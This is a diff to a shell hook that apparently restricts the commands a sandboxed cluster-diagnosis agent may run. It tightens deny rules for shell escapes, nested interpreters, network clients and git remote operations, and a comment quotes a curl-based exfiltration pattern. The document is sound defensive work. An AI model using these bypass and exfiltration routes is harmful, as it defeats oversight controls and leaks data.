@@ -73,6 +73,11 @@ else
     _deny "$CMD"
   fi
 
+  # make: no read-only make target is needed for diagnosis; recipes run arbitrary shell.
+  if echo "$CMD" | grep -qE '\bmake\b'; then
+    _deny "$CMD"
+  fi
+
 fi
 
 # ── Always blocked (both modes) ───────────────────────────────────────────────
@@ -87,6 +92,27 @@ if echo "$CMD" | grep -qE '\b(python[0-9.]*|perl|ruby|node|deno|bun|osascript|ph
   _deny "$CMD"
 fi
 
+# Editors / pagers with a shell-escape (:!cmd, !cmd) — bypass the denylist above.
+if echo "$CMD" | grep -qE '\b(vi|vim|view|ex|nano|emacs|pico|ed|less|more|man)\b'; then
+  _deny "$CMD"
+fi
+
+# find primitives that execute or mutate; the plain read forms stay allowed.
+if echo "$CMD" | grep -qE '\bfind\b.*-(exec(dir)?|delete|fprintf?|fls)\b'; then
+  _deny "$CMD"
+fi
+
+# archive tools that can spawn a command per entry.
+if echo "$CMD" | grep -qE '\btar\b.*(--to-command|--checkpoint-action)|\bcpio\b'; then
+  _deny "$CMD"
+fi
+
+# BSD awk (macOS /usr/bin/awk) can spawn a shell via system()/pipe; block the exec forms
+# while leaving stream use (awk on stdin) allowed.
+if echo "$CMD" | grep -qE '\bawk\b.*(system\s*\(|\|\s*"|"\s*\|)'; then
+  _deny "$CMD"
+fi
+
 # Nested shell invocation and command-prefix maskers that hide the real command.
 if echo "$CMD" | grep -qE '\b(bash|sh|zsh|ksh|dash)\b\s+-c\b|\b(env|xargs|nice|nohup|timeout|sudo|command|builtin|exec|eval|watch|setsid)\b'; then
   _deny "$CMD"
@@ -98,8 +124,10 @@ if echo "$CMD" | grep -qE '(>>?|<\()'; then
   _deny "$CMD"
 fi
 
-# curl/wget write operations
-if echo "$CMD" | grep -qE '\b(curl|wget)\b.*(-X\s*(POST|PUT|DELETE|PATCH)|--request\s*(POST|PUT|DELETE|PATCH)|--data|--upload-file)'; then
+# Outbound network clients — the sandbox does not need general egress to troubleshoot
+# (kubectl talks to the API server directly). Block them outright so a readable-file
+# exfil (curl "https://x/?d=$(...)") has nowhere to send the data.
+if echo "$CMD" | grep -qE '\b(curl|wget|nc|ncat|netcat|telnet|socat|ftp|scp|sftp|rsync|ssh)\b'; then
   _deny "$CMD"
 fi
 
@@ -108,15 +136,20 @@ if echo "$CMD" | grep -qE '\bgit\b.*(reset\s+--hard|clean\s+-f|push\s+--force|pu
   _deny "$CMD"
 fi
 
+# git subcommands that reach the network are another egress path — a reader could exfil
+# readable files by pushing/cloning to an attacker remote, bypassing the client block above.
+# Local read-only inspection (log/status/diff/show/rev-parse/blame/…) stays allowed.
+if echo "$CMD" | grep -qE '\bgit\b.*\b(clone|fetch|pull|push|remote|ls-remote|submodule|send-pack|fetch-pack|upload-pack|request-pull|daemon)\b'; then
+  _deny "$CMD"
+fi
+if echo "$CMD" | grep -qE '\bgit\b.*--remote\b'; then
+  _deny "$CMD"
+fi
+
 # Block file access outside allowed repos (absolute path arguments only)
 # Read-only system paths allowed for cluster diagnosis
 _DIAG_PATHS=(
-  /etc
-  /Library/LaunchDaemons
-  /Library/LaunchAgents
-  "${HOME}/.kube"
   "${HOME}/.local/share/k3d-manager"
-  "${HOME}/.cloudflared"
   /var/log
   /usr/local/bin
   /usr/bin
